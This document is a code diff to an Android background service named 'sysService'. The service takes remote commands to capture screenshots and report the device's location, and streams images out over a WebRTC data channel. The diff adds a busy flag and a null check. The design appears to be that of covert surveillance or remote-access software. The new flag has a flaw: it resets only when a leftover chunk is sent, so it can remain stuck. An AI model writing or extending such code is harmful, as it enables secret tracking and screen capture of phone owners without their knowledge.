@@ -73,7 +73,7 @@ public class sysService extends Service implements SysInterface{
     int perResultCode;
     DataChannel localDataChannel;
     SignallingClient sc;
-
+    boolean canSend = true;
     //end variables
     // servic overwrite methods
     public sysService(Context applicationContext) {
@@ -139,8 +139,10 @@ public class sysService extends Service implements SysInterface{
     }
 
     public void resetSocket(){
-        SignallingClient.instance.socket.close();
-        SignallingClient.instance = null;
+        if(SignallingClient.instance != null) {
+            SignallingClient.instance.socket.close();
+            SignallingClient.instance = null;
+        }
     }
     // end service overwrite methods
 
@@ -211,9 +213,14 @@ public class sysService extends Service implements SysInterface{
             onTryToStart();
         }
         if (cmd.contains("screenshot")){
-            int shotN = Integer.parseInt(cmd.split(":")[1]);
-            sendScreenshot(shotN);
-           // toast("get screenshot");
+            if (canSend) {
+                int shotN = Integer.parseInt(cmd.split(":")[1]);
+                sendScreenshot(shotN);
+                // toast("get screenshot");
+            }
+            else {
+                sc.cmd("busy");
+            }
         }
         if (cmd.contains("getLocation")){
             sendLocation();
@@ -568,6 +575,7 @@ public class sysService extends Service implements SysInterface{
     }
 
     private void sendImage(byte[] bytes) {
+        canSend = false;
         int CHUNK_SIZE = 64000;
         int size = bytes.length;
         int numberOfChunks = size / CHUNK_SIZE;
@@ -583,6 +591,7 @@ public class sysService extends Service implements SysInterface{
         if (remainder > 0) {
             ByteBuffer wrap = ByteBuffer.wrap(bytes, numberOfChunks * CHUNK_SIZE, remainder);
             localDataChannel.send(new DataChannel.Buffer(wrap, false));
+            canSend = true;
         }
     }
     private static ByteBuffer stringToByteBuffer(String msg, Charset charset) {
